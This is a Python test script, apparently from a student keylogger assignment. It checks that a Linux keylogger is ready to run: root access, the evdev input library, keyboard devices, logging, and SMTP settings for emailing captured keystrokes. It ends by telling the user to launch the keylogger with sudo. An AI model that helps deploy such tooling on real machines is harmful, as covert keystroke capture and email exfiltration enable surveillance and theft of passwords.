#!/usr/bin/env python3
"""
Test Script for Linux Keylogger
Verifies all components are working correctly
"""

import os
import sys
import time
import subprocess
from datetime import datetime

def print_header(text):
    print("\n" + "=" * 60)
    print("  " + text)
    print("=" * 60)

def print_success(text):
    print("✓ " + text)

def print_error(text):
    print("✗ " + text)

def print_warning(text):
    print("⚠ " + text)

def print_info(text):
    print("ℹ " + text)

def test_privileges():
    """Test 1: Check root privileges"""
    print_header("TEST 1: Privilege Check")
    if os.geteuid() == 0:
        print_success("Running as root (UID: {})".format(os.geteuid()))
        return True
    else:
        print_error("Not running as root (UID: {})".format(os.geteuid()))
        return False

def test_evdev():
    """Test 2: Check evdev module"""
    print_header("TEST 2: evdev Module")
    try:
        import evdev
        print_success("evdev module loaded successfully")
        return True
    except ImportError:
        print_error("evdev module not found")
        return False

def test_devices():
    """Test 3: Check input devices"""
    print_header("TEST 3: Input Devices")
    try:
        import evdev
        devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
        print_success("Found {} input devices".format(len(devices)))
        
        keyboard_found = False
        for device in devices:
            print("  - {}: {}".format(device.path, device.name))
            if 'keyboard' in device.name.lower():
                keyboard_found = True
                print_success("Keyboard: {}".format(device.path))
        
        if keyboard_found:
            return True
        else:
            print_warning("No keyboard found in evdev list")
            # Try /proc/bus/input/devices
            if os.path.exists('/proc/bus/input/devices'):
                with open('/proc/bus/input/devices', 'r') as f:
                    content = f.read()
                    if 'keyboard' in content.lower():
                        print_success("Keyboard found in /proc/bus/input/devices")
                        return True
            print_error("No keyboard device found")
            return False
    except Exception as e:
        print_error("Error: {}".format(e))
        return False

def test_logging():
    """Test 4: Logging functionality"""
    print_header("TEST 4: Logging")
    test_log = "test_log.log"
    try:
        # Write test log
        with open(test_log, 'w') as f:
            f.write("Test log entry\n")
        print_success("Log file created")
        
        # Read test log
        with open(test_log, 'r') as f:
            content = f.read()
            if 'Test log entry' in content:
                print_success("Log content verified")
            else:
                print_error("Log content mismatch")
                return False
        
        # Clean up
        os.remove(test_log)
        print_success("Log file cleaned up")
        return True
    except Exception as e:
        print_error("Error: {}".format(e))
        return False

def test_keylogger_script():
    """Test 5: Keylogger script syntax"""
    print_header("TEST 5: Keylogger Script")
    if not os.path.exists("keylogger.py"):
        print_error("keylogger.py not found")
        return False
    
    try:
        # Check syntax
        result = subprocess.run(
            ["python3", "-m", "py_compile", "keylogger.py"],
            capture_output=True
        )
        if result.returncode == 0:
            print_success("keylogger.py syntax valid")
            return True
        else:
            print_error("Syntax errors found:")
            print(result.stderr.decode())
            return False
    except Exception as e:
        print_error("Error: {}".format(e))
        return False

def test_email_config():
    """Test 6: Email configuration"""
    print_header("TEST 6: Email Configuration")
    try:
        # Read configuration from keylogger.py
        with open("keylogger.py", 'r') as f:
            content = f.read()
        
        # Check for email configuration
        config_items = [
            ('EMAIL_RECIPIENT', 'Email recipient'),
            ('EMAIL_SENDER', 'Email sender'),
            ('SMTP_SERVER', 'SMTP server'),
            ('SMTP_PORT', 'SMTP port')
        ]
        
        all_found = True
        for var, desc in config_items:
            if var in content:
                print_success("{} configured".format(desc))
            else:
                print_warning("{} not found".format(desc))
                all_found = False
        
        # Check if password is set (not default)
        if 'SMTP_PASSWORD = "your_app_password"' in content:
            print_warning("SMTP password still set to default")
            print_info("Please update SMTP_PASSWORD in keylogger.py")
            all_found = False
        else:
            print_success("SMTP password configured")
        
        return all_found
    except Exception as e:
        print_error("Error: {}".format(e))
        return False

def test_permissions():
    """Test 7: Check file permissions"""
    print_header("TEST 7: File Permissions")
    files_to_check = ["keylogger.py", "keylogger.sh"]
    
    all_good = True
    for file in files_to_check:
        if os.path.exists(file):
            if os.access(file, os.R_OK):
                print_success("{}: readable".format(file))
            else:
                print_error("{}: not readable".format(file))
                all_good = False
            
            if os.access(file, os.X_OK):
                print_success("{}: executable".format(file))
            else:
                print_warning("{}: not executable".format(file))
                all_good = False
        else:
            print_error("{}: not found".format(file))
            all_good = False
    
    return all_good

def test_system_info():
    """Test 8: System information"""
    print_header("TEST 8: System Information")
    
    try:
        print_info("Kernel: {}".format(os.uname()))
        print_info("Python: {}".format(sys.version))
        
        # Check for /proc/bus/input/devices
        if os.path.exists('/proc/bus/input/devices'):
            print_success("/proc/bus/input/devices exists")
        else:
            print_warning("/proc/bus/input/devices not found")
        
        # Check for /dev/input
        if os.path.exists('/dev/input'):
            print_success("/dev/input exists")
        else:
            print_warning("/dev/input not found")
        
        return True
    except Exception as e:
        print_error("Error: {}".format(e))
        return False

def main():
    """Run all tests"""
    print("=" * 60)
    print("  KEYLOGGER TEST SUITE")
    print("  Linux_Keylogger_Project_Assignment")
    print("=" * 60)
    
    tests = [
        ("Privilege Check", test_privileges()),
        ("evdev Module", test_evdev()),
        ("Input Devices", test_devices()),
        ("Logging", test_logging()),
        ("Script Syntax", test_keylogger_script()),
        ("Email Configuration", test_email_config()),
        ("Permissions", test_permissions()),
        ("System Info", test_system_info())
    ]
    
    # Results
    passed = sum(1 for _, result in tests if result)
    total = len(tests)
    
    print("\n" + "=" * 60)
    print("  TEST RESULTS")
    print("=" * 60)
    
    for name, result in tests:
        status = "✓ PASS" if result else "✗ FAIL"
        print("  [{}] {}".format(status, name))
    
    print("\n" + "-" * 60)
    print("  Passed: {}/{} ({:.1f}%)".format(passed, total, (passed/total)*100))
    
    if passed == total:
        print("\n  🎉 All tests passed!")
        print("\n  You can now run the keylogger:")
        print("    sudo ./keylogger.sh start")
        print("  Or directly:")
        print("    sudo python3 keylogger.py")
    else:
        print("\n  ⚠️ Some tests failed. Please check:")
        if not tests[0][1]:
            print("    - Run with sudo")
        if not tests[1][1]:
            print("    - Install evdev: pip3 install evdev")
        if not tests[2][1]:
            print("    - Check if keyboard is connected")
        if not tests[5][1]:
            print("    - Configure email settings in keylogger.py")
    
    print("\n" + "=" * 60)

if __name__ == "__main__":
    main()
